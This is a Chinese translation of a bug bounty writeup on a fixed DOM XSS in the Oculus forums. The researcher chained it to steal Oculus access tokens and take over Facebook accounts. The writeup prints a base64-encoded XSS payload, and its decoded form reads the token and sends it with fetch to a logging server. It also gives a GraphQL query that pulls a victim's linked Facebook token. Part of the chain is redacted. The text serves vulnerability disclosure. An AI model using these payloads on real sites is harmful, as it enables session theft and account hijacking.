@@ -1,0 +1,253 @@
+![](https://image.3001.net/images/20210105/1609840307_5ff436b346fad2820088d.jpg!small)**该Writeup涉及Facebook旗下VR穿戴公司Oculus论坛forums.oculusvr.com，攻击者利用其存在的XSS漏洞可以窃取受害者登录Oculus官网时的访问令牌(Access
+Token)，以此实现对Facebook和关联Oculus用户的账户劫持。漏洞最终被Facebook给予了高达$30000的奖励。我们一起来看看作者的发现过程和思路。**
+
+## 漏洞细节
+
+漏洞原因主要在于，Oculus论坛forums.oculusvr.com采用了oculus.com的认证机制，该认证机制使用了路径
+**https://graph.oculus.com/authenticate_web_application/** 来验证登录用户，之后会把用户跳转到
+**https://forums.oculusvr.com/entry/oculus**
+，跳转后用户携带了一个oculus访问令牌(access_token)，且利用该访问令牌，可以有权限访问
+**graph.oculus.com/graphql**
+，并实现GraphQL查询。因此，基于该GraphQL查询，恶意用户可以利用该功能实现对其他用户的账户劫持。
+
+由于论坛forums.oculus.com基于开源网站应用Vanilla
+Forum搭建，本来不在Facebook漏洞奖励项目内，但是，由于该漏洞存在Facebook论坛的身份验证机制中，且攻击者无需创建新的论坛账户就能实现漏洞利用，因此之后Facebook也把该漏洞认定为重要和有效。
+
+从页面
+**[https://forums.oculusvr.com/entry/oculus﻿](https://forums.oculusvr.com/entry/oculus)**
+中的源码可以看到，其开启了调试模式，并嵌入了以下JS脚本文件-**<https://forums.oculusvr.com/plugins/oculus/js/oculus-oauth.js>**
+，通过了解该JS文件，可知其中在state参数读取时采用了document.write方法，如果把攻击PAYLOAD赋值给state(#state=PAYLOAD)，那会不会产生安全问题呢？
+
+请注意，尽管document.location也被传递给了document.write，但这里我们可以用其URL中涉及的“state”参数来加载攻击测试的有效负载Payload，因为document.location最后会将带有效负载Payload的URL编码格式，之后，在decodeURIComponent
+方法解码hash片段提取“response”时，“state”将会被解码。
+
+    
+    
+    var oculusConnect = function(params) {
+         if (typeof params === "undefined") {
+             return;
+         }
+     if (typeof params.connect === "undefined") {
+    return;
+     } 
+    var response = decodeURIComponent(document.location.hash);
+    var hash = response.substring(response.indexOf("#") + 1, response.indexOf("&")); 
+    var queryString = response.replace("#" + hash, ""); 
+    var queryStringSplit = queryString.split("&"); 
+    var state = getParam(queryStringSplit, "state"); 
+    var savedState = params.connect.savedState; 
+    var hashSplit = hash.split("="); 
+    var hashKey = hashSplit[0]; 
+    var hashValue = hashSplit[1]; 
+    var loginType = this.frameElement.id; 
+    
+    if (params.connect.debug) {     
+    document.write("login type : " + loginType + 
+    ";<br >document location:" + document.location + 
+    ";<br >Saved State:" + savedState + 
+    ";<br >State:" + state + 
+    ";<br >Hash Key:" +  hashKey); 
+    }
+    ...
+    
+    
+    #Passing parameters to oculusConnect function#
+     document.addEventListener("DOMContentLoaded", function() {
+            var params = {
+                "connect":
+                    {
+                        "debug" : "1" ,
+                        "savedState": "G1H7LE7UOJ" ,
+                        "authorizeUrl": "https://graph.oculus.com/authenticate_web_application" ,
+                        "oculusHash": "X" ,
+                        "associationKey": "OC|1238816349468370|" ,
+                        "webAddress": "https://forums.oculusvr.com"
+                    }
+            }
+    oculusConnect(params);
+
+至此，代码分析到这里，初步的感觉是可以从Payload中做手脚把它构造成一个XSS，但是，如果认真看其中的代码可知，在document.write方法调用前还有代码
+**var loginType = this.frameElement.id;** ，所以这并不如我们所料，这里，如果按照我们之前的构造将会返回错误消息
+**“TypeError: Cannot read property ‘id’ of null”**
+，只有当前这个页面是框架化且与其父页面是同源才能正确调用通过。为此，需要把论坛网站forums.oculusvr.com中的页面
+**https://forums.oculusvr.com/entry/oculus#state=payload**
+进行框架化，然后把其框架化的URL链接发送给受害者，才能触发漏洞。
+
+## 开源网站应用Vanilla Forums中的嵌入利用
+
+经分析发现，开源网站应用Vanilla Forums源码中加载嵌入了一个白名单网站列表，如下：
+
+    
+    
+    public function unembedContent(string $content): string {
+            if ($this->embedConfig->isYoutubuEnabled()) {
+                $content = preg_replace(
+                    '`<iframe.*src="https?://.*youtubu\.com/embed/([a-z0-9_-]*)".*</iframe>`i',
+                    "\nhttps://www.youtubu.com/watch?v=$1\n",
+                    $content
+                );
+                $content = preg_replace(
+                    '`<object.*value="https?://.*youtubu\.com/v/([a-z0-9_-]*)[^"]*".*</object>`i',
+                    "\nhttps://www.youtubu.com/watch?v=$1\n",
+                    $content
+                );
+    
+            }
+    
+            if ($this->embedConfig->isVimeoEnabled()) {
+                $content = preg_replace(
+                    '`<iframe.*src="((https?)://.*vimeo\.com/video/([0-9]*))".*</iframe>`i',
+                    "\n$2://vimeo.com/$3\n",
+                    $content
+                );
+                $content = preg_replace(
+                    '`<object.*value="((https?)://.*vimeo\.com.*clip_id=([0-9]*)[^"]*)".*</object>`i',
+                    "\n$2://vimeo.com/$3\n",
+                    $content
+                );
+            }
+            if ($this->embedConfig->isGettyEnabled()) {
+                $content = preg_replace(
+                    '`<iframe.*src="(https?:)?//embed\.gettyimages\.com/embed/([\w=?&+-]*)" width="([\d]*)" height="([\d]*)".*</iframe>`i',
+                    "\nhttp://embed.gettyimages.com/$2/$3/$4\n",
+                    $content
+                );
+            }
+            return $content;
+        }
+        private function getEmbedRegexes(): array {
+            return [
+                'YouTubu' => [
+                    'regex' => [
+                        // Warning: Very long regex.
+                        '/https?:\/\/(?:(?:www.)|(?:m.))?(?:(?:youtubu.com)|(?:youtu.be))\/(?:(?:playlist?)'
+                        . '|(?:(?:watch\?v=)?(?P<videoId>[\w-]{11})))(?:\?|\&)?'
+                        . '(?:list=(?P<listId>[\w-]*))?(?:t=(?:(?P<minutes>\d*)m)?(?P<seconds>\d*)s)?(?:#t=(?P<start>\d*))?/i'
+                    ],
+                ],
+    
+                'Twitter' => [
+                    'regex' => ['/https?:\/\/(?:www\.)?twitter\.com\/(?:#!\/)?(?:[^\/]+)\/status(?:es)?\/([\d]+)/i'],
+                ],
+                'Vimeo' => [
+                    'regex' => ['/https?:\/\/(?:www\.)?vimeo\.com\/(?:channels\/[a-z0-9]+\/)?(\d+)/i'],
+                ],
+                'Vine' => [
+                    'regex' => ['/https?:\/\/(?:www\.)?vine\.co\/(?:v\/)?([\w]+)/i'],
+                ],
+                'Instagram' => [
+                    'regex' => ['/https?:\/\/(?:www\.)?instagr(?:\.am|am\.com)\/p\/([\w-]+)/i'],
+                ],
+                'Pinterest' => [
+                    'regex' => [
+                        '/https?:\/\/(?:www\.)?pinterest\.com\/pin\/([\d]+)/i',
+                        '/https?:\/\/(?:www\.)?pinterest\.ca\/pin\/([\d]+)/i',
+                    ],
+                ],
+                'Getty' => [
+                    'regex' => ['/https?:\/\/embed.gettyimages\.com\/([\w=?&;+-_]*)\/([\d]*)\/([\d]*)/i'],
+                ],
+                'Twitch' => [
+                    'regex' => ['/https?:\/\/(?:www\.)?twitch\.tv\/([\w]+)$/i'],
+                ],
+                'TwitchRecorded' => [
+                    'regex' => ['/https?:\/\/(?:www\.)?twitch\.tv\/videos\/(\w+)$/i'],
+                ],
+                'Soundcloud' => [
+                    'regex' => ['/https?:(?:www\.)?\/\/soundcloud\.com\/([\w=?&;+-_]*)\/([\w=?&;+-_]*)/i'],
+                ],
+                'Gifv' => [
+                    'regex' => ['/https?:\/\/i\.imgur\.com\/([a-z0-9]+)\.gifv/i'],
+                ],
+                'Wistia' => [
+                    'regex' => [
+                        // Format1
+                        '/https?:\/\/(?:[A-za-z0-9\-]+\.)?(?:wistia\.com|wi\.st)\/.*?'
+                        . '\?wvideo=(?<videoID>([A-za-z0-9]+))(\?wtime=(?<time>((\d)+m)?((\d)+s)?))?/i',
+                        // Format2
+    
+                        '/https?:\/\/([A-za-z0-9\-]+\.)?(wistia\.com|wi\.st)\/medias\/(?<videoID>[A-za-z0-9]+)'
+                        . '(\?wtime=(?<time>((\d)+m)?((\d)+s)?))?/i',
+                    ],
+                ],
+            ];
+        }
+    }
+    
+
+这其中的某个白名单网站存在一个漏洞，导致能让我从Vanilla
+Forums嵌入页面跳转到https://forums.oculusvr.com/entry/oculus ，并实现最终的XSS
+Payload触发。遗憾的是，由于该漏洞还未完全修复，因此抱歉在此我不能公开该漏洞。
+
+## 漏洞利用
+
+用Oculus账户登录forums.oculus.com网站，到“New Discussion”区域点击“Toggle Html
+View“，然后添加进Vanilla Forums中的漏洞利用Payload，这里原谅我做了隐藏处理。
+
+> <iframe src="https://REDACTED/REDACTED" />
+
+之后，点击“Preview” 和“Post
+Discussion”，将会创建一个包含REDACTED的框架化进程，REDACTED中的框架化页面会触发跳转至最终的XSS漏洞利用URL路径。成型的可以窃取受害者access_token的XSS
+Payload如下：
+
+    
+    
+    https://forums.oculusvr.com/entry/oculus/#access_token=test&state=<script>
+    eval(atob("dmFyIGlmcm0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTtpZnJ
+    tLnNldEF0dHJpYnV0ZSgnaWQnLCAndGVzdCcpO2lmcm0uc2V0QXR0cmlidXRlKCdzcmMnLCAna
+    HR0cHM6Ly9ncmFwaC5vY3VsdXMuY29tL2F1dGhlbnRpY2F0ZV93ZWJfYXBwbGljYXRpb24/YWN
+    jZXNzX3Rva2VuPU9DJTdDMTIzODgxNjM0OTQ2ODM3MCU3QyZyZWRpcmVjdF91cmk9aHR0cHMlM
+    0ElMkYlMkZmb3J1bXMub2N1bHVzdnIuY29tJTJGZW50cnklMkZvY3VsdXMmc3RhdGU9VjFIVzl
+    TMkxHWiZtZXRob2Q9cG9zdCcpO2lmcm0ub25sb2FkID0gZnVuY3Rpb24oKXthbGVydChkb2N1b
+    WVudC5nZXRFbGVtZW50QnlJZCgndGVzdCcpLmNvbnRlbnRXaW5kb3cubG9jYXRpb24uaHJlZil
+    9O2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZybSk7"));</script>
+
+由于Vanilla Forums中的漏洞利用Payload包含了太多类似 **=,
+&**的字符，可能会对oculusConnect方法中的state参数提取产生干扰，因此我把其进行了base64编码，其原始形式为：
+
+    
+    
+    var ifrm = document.createElement('iframe');
+    ifrm.setAttribute('id', 'test');
+    ifrm.setAttribute('src', 'https://graph.oculus.com/authenticate_web_application?access_token=OC|1238816349468370|&redirect_uri=https://forums.oculusvr.com/entry/oculus&state=V1HW9S2LGZ&method=post');
+    ifrm.onload = function(){
+           var token = document.getElementById('test').contentWindow.location.href;
+           fetch("https://logging-server/log.php?x=" + token);
+    };
+    document.body.appendChild(ifrm);
+
+  
+
+此外，我还构造了另外的一个框架化页面，它会对https://graph.oculus.com/authenticate_web_application发起请求，然后携带用户有效access_token执行到https://forums.oculusvr.com/entry/oculus的跳转，由于该页面中的iframe和其父页面均为同源，因此我们可以访问其iframe界面并读取其location.href属性，最终可以把收集到的access_token信息发送到我们控制的服务器中。
+
+## 对Oculus和Facebook用户的账户劫持
+
+从“Oculus Forums”页面 **view-source:https://forums.oculusvr.com/entry/oculus**
+源码可知，其生成了一个应用id-1238816349468370，并具备对 **https://graph.oculus.com/graphql**
+的GraphQL查询访问权限。但是，账户劫持需要涉及到密码更改、contactpoints添加或知晓用户PIN码，而且，该Oculus
+Forums的Web页面也无法具备对Facebook绑定用户access_token的读取。不过之后，我从安全研究者JOSIP
+FRANJKOVIĆ的博客里发现了一种解决此困惑的技巧方法：
+
+> https://graph.oculus.com/graphql?access_token=VICTIM_TOKEN&method=post  
+> &q=viewer(){linked_accounts_info{facebook_account{access_token}}}
+
+但这里窃取的access_token不能实现真正意义的劫持，只能实现受害者的用户信息读取，以及受害者应用和其所在组织机构的更改。
+
+幸运的是， **最终我发现了第三个劲爆漏洞** ，利用其可以把窃取的用户令牌access_token升级成另一个应用身份( WWW
+752908224809889
+)，并能绕过应用身份限制，去读取Facebook绑定用户的access_token以实现Facebook用户账户劫持，或用该Facebook绑定用户的access_token访问
+**https://graph.oculus.com/fbauth** 去登录关联的Oculus账户。
+
+## 总结
+
+最终，通过综合利用上述三个漏洞实现了Facebook和Oculus账户劫持，危害严重。在此我还是希望大家按众测范围去挖掘漏洞，只是该漏洞相对严重，且漏洞问题出在Facebook自身的源码中，因此最后被Facebook给予了奖励，要不然也是白找。
+
+## 漏洞上报和处理进程
+
+> 2020.11.24 漏洞上报  
+> 2020.11.24 Facebook确认漏洞有效  
+> 2020.12.1 Facebook修复漏洞  
+> 2020.12.17 Facebook奖励了$30K
+
+ **参考来源：[yasmm](https://ysamm.com/?p=525)，编译整理：clouds，转载请注明来自Freebuf.com**
+
